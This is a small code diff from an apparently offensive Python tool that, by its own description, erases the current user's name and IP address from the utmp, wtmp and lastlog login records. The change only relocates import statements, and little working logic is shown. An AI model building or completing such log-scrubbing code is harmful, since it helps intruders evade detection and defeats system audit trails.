@@ -3,11 +3,6 @@
 @description: Attempts to remove the currently logged in username and IP address from utmp, wtmp and lastlog. Intrusive method.
 @author: ohdae & sk [bindshell@live.com]
 '''
-import logging
-import struct
-import getpass
-import pwd
-
 
 def scrub():
     if currentuser != "root":
@@ -69,6 +64,11 @@ def writeNewFile(filePath, fileContents):
     f.write(fileContents)
     f.close()
 
+
+import logging
+import struct
+import getpass
+import pwd
 
 UTMP_STRUCT_SIZE    = 384
 LASTLOG_STRUCT_SIZE = 292
